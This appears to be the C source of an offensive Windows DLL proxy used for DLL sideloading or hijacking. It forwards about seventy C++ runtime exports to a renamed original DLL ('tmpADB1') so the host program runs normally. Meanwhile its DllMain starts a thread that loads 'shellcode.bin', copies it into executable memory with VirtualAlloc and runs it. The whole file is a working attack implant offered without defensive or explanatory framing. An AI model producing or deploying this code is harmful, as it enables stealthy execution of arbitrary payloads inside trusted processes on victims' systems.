
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:_CreateFrameInfo=tmpADB1._CreateFrameInfo,@1")
#pragma comment(linker, "/export:_CxxThrowException=tmpADB1._CxxThrowException,@2")
#pragma comment(linker, "/export:_FindAndUnlinkFrame=tmpADB1._FindAndUnlinkFrame,@3")
#pragma comment(linker, "/export:_IsExceptionObjectToBeDestroyed=tmpADB1._IsExceptionObjectToBeDestroyed,@4")
#pragma comment(linker, "/export:_SetWinRTOutOfMemoryExceptionCallback=tmpADB1._SetWinRTOutOfMemoryExceptionCallback,@5")
#pragma comment(linker, "/export:__AdjustPointer=tmpADB1.__AdjustPointer,@6")
#pragma comment(linker, "/export:__BuildCatchObject=tmpADB1.__BuildCatchObject,@7")
#pragma comment(linker, "/export:__BuildCatchObjectHelper=tmpADB1.__BuildCatchObjectHelper,@8")
#pragma comment(linker, "/export:__C_specific_handler=tmpADB1.__C_specific_handler,@9")
#pragma comment(linker, "/export:__C_specific_handler_noexcept=tmpADB1.__C_specific_handler_noexcept,@10")
#pragma comment(linker, "/export:__CxxDetectRethrow=tmpADB1.__CxxDetectRethrow,@11")
#pragma comment(linker, "/export:__CxxExceptionFilter=tmpADB1.__CxxExceptionFilter,@12")
#pragma comment(linker, "/export:__CxxFrameHandler=tmpADB1.__CxxFrameHandler,@13")
#pragma comment(linker, "/export:__CxxFrameHandler2=tmpADB1.__CxxFrameHandler2,@14")
#pragma comment(linker, "/export:__CxxFrameHandler3=tmpADB1.__CxxFrameHandler3,@15")
#pragma comment(linker, "/export:__CxxQueryExceptionSize=tmpADB1.__CxxQueryExceptionSize,@16")
#pragma comment(linker, "/export:__CxxRegisterExceptionObject=tmpADB1.__CxxRegisterExceptionObject,@17")
#pragma comment(linker, "/export:__CxxUnregisterExceptionObject=tmpADB1.__CxxUnregisterExceptionObject,@18")
#pragma comment(linker, "/export:__DestructExceptionObject=tmpADB1.__DestructExceptionObject,@19")
#pragma comment(linker, "/export:__FrameUnwindFilter=tmpADB1.__FrameUnwindFilter,@20")
#pragma comment(linker, "/export:__GetPlatformExceptionInfo=tmpADB1.__GetPlatformExceptionInfo,@21")
#pragma comment(linker, "/export:__NLG_Dispatch2=tmpADB1.__NLG_Dispatch2,@22")
#pragma comment(linker, "/export:__NLG_Return2=tmpADB1.__NLG_Return2,@23")
#pragma comment(linker, "/export:__RTCastToVoid=tmpADB1.__RTCastToVoid,@24")
#pragma comment(linker, "/export:__RTDynamicCast=tmpADB1.__RTDynamicCast,@25")
#pragma comment(linker, "/export:__RTtypeid=tmpADB1.__RTtypeid,@26")
#pragma comment(linker, "/export:__TypeMatch=tmpADB1.__TypeMatch,@27")
#pragma comment(linker, "/export:__current_exception=tmpADB1.__current_exception,@28")
#pragma comment(linker, "/export:__current_exception_context=tmpADB1.__current_exception_context,@29")
#pragma comment(linker, "/export:__intrinsic_setjmp=tmpADB1.__intrinsic_setjmp,@30")
#pragma comment(linker, "/export:__intrinsic_setjmpex=tmpADB1.__intrinsic_setjmpex,@31")
#pragma comment(linker, "/export:__processing_throw=tmpADB1.__processing_throw,@32")
#pragma comment(linker, "/export:__report_gsfailure=tmpADB1.__report_gsfailure,@33")
#pragma comment(linker, "/export:__std_exception_copy=tmpADB1.__std_exception_copy,@34")
#pragma comment(linker, "/export:__std_exception_destroy=tmpADB1.__std_exception_destroy,@35")
#pragma comment(linker, "/export:__std_terminate=tmpADB1.__std_terminate,@36")
#pragma comment(linker, "/export:__std_type_info_compare=tmpADB1.__std_type_info_compare,@37")
#pragma comment(linker, "/export:__std_type_info_destroy_list=tmpADB1.__std_type_info_destroy_list,@38")
#pragma comment(linker, "/export:__std_type_info_hash=tmpADB1.__std_type_info_hash,@39")
#pragma comment(linker, "/export:__std_type_info_name=tmpADB1.__std_type_info_name,@40")
#pragma comment(linker, "/export:__telemetry_main_invoke_trigger=tmpADB1.__telemetry_main_invoke_trigger,@41")
#pragma comment(linker, "/export:__telemetry_main_return_trigger=tmpADB1.__telemetry_main_return_trigger,@42")
#pragma comment(linker, "/export:__unDName=tmpADB1.__unDName,@43")
#pragma comment(linker, "/export:__unDNameEx=tmpADB1.__unDNameEx,@44")
#pragma comment(linker, "/export:__uncaught_exception=tmpADB1.__uncaught_exception,@45")
#pragma comment(linker, "/export:__uncaught_exceptions=tmpADB1.__uncaught_exceptions,@46")
#pragma comment(linker, "/export:__vcrt_GetModuleFileNameW=tmpADB1.__vcrt_GetModuleFileNameW,@47")
#pragma comment(linker, "/export:__vcrt_GetModuleHandleW=tmpADB1.__vcrt_GetModuleHandleW,@48")
#pragma comment(linker, "/export:__vcrt_InitializeCriticalSectionEx=tmpADB1.__vcrt_InitializeCriticalSectionEx,@49")
#pragma comment(linker, "/export:__vcrt_LoadLibraryExW=tmpADB1.__vcrt_LoadLibraryExW,@50")
#pragma comment(linker, "/export:_get_purecall_handler=tmpADB1._get_purecall_handler,@51")
#pragma comment(linker, "/export:_get_unexpected=tmpADB1._get_unexpected,@52")
#pragma comment(linker, "/export:_is_exception_typeof=tmpADB1._is_exception_typeof,@53")
#pragma comment(linker, "/export:_local_unwind=tmpADB1._local_unwind,@54")
#pragma comment(linker, "/export:_purecall=tmpADB1._purecall,@55")
#pragma comment(linker, "/export:_set_purecall_handler=tmpADB1._set_purecall_handler,@56")
#pragma comment(linker, "/export:_set_se_translator=tmpADB1._set_se_translator,@57")
#pragma comment(linker, "/export:longjmp=tmpADB1.longjmp,@58")
#pragma comment(linker, "/export:memchr=tmpADB1.memchr,@59")
#pragma comment(linker, "/export:memcmp=tmpADB1.memcmp,@60")
#pragma comment(linker, "/export:memcpy=tmpADB1.memcpy,@61")
#pragma comment(linker, "/export:memmove=tmpADB1.memmove,@62")
#pragma comment(linker, "/export:memset=tmpADB1.memset,@63")
#pragma comment(linker, "/export:set_unexpected=tmpADB1.set_unexpected,@64")
#pragma comment(linker, "/export:strchr=tmpADB1.strchr,@65")
#pragma comment(linker, "/export:strrchr=tmpADB1.strrchr,@66")
#pragma comment(linker, "/export:strstr=tmpADB1.strstr,@67")
#pragma comment(linker, "/export:unexpected=tmpADB1.unexpected,@68")
#pragma comment(linker, "/export:wcschr=tmpADB1.wcschr,@69")
#pragma comment(linker, "/export:wcsrchr=tmpADB1.wcsrchr,@70")
#pragma comment(linker, "/export:wcsstr=tmpADB1.wcsstr,@71")


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
	//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen("shellcode.bin", "rb");
	fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);
	
	//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
        fread(buffer, size, 1, fp);

        void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        memcpy(exec, buffer, size);

        ((void(*) ())exec)();

	return 0;
}

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        HANDLE threadHandle;

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH:
		// https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
                threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
                CloseHandle(threadHandle);

            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
            case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
    }



